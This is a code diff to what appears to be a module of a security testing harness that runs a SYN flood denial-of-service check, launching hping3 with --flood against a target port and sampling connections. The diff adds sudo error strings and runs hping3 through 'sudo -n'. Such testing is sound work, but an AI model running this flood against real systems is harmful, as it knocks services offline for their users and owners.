@@ -33,7 +33,8 @@ META = {
     "blocked_regex": r"^INFO|INCONCLUSIVE",
 }
 
-_PRIV_ERR = ("operation not permitted", "raw socket", "permission denied")
+_PRIV_ERR = ("operation not permitted", "raw socket", "permission denied",
+             "a password is required", "a terminal is required", "sudo:")
 
 
 def _connect_ok(host, port, timeout=1.5):
@@ -48,11 +49,14 @@ def run(target, ctx):
     out = [f"# SYN flood DoS vs {target}:{SYN_PORT}  "
            f"({FLOOD_SECONDS}s flood, {SAMPLES} connect samples)"]
 
+    # elevate hping3 via `sudo -n` (never prompts) when not root, so a per-command
+    # NOPASSWD rule for hping3 works without running the whole harness as root.
+    import core
+    flood_cmd = ["timeout", str(FLOOD_SECONDS)] + core.sudo_prefix() + \
+                ["hping3", "-S", "-p", str(SYN_PORT), "--flood", target]
     try:
         flood = subprocess.Popen(
-            ["timeout", str(FLOOD_SECONDS), "hping3", "-S", "-p", str(SYN_PORT),
-             "--flood", target],
-            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+            flood_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
     except FileNotFoundError:
         return "\n".join(out) + "\n[ERROR] hping3 not found (install hping3). INCONCLUSIVE"
 
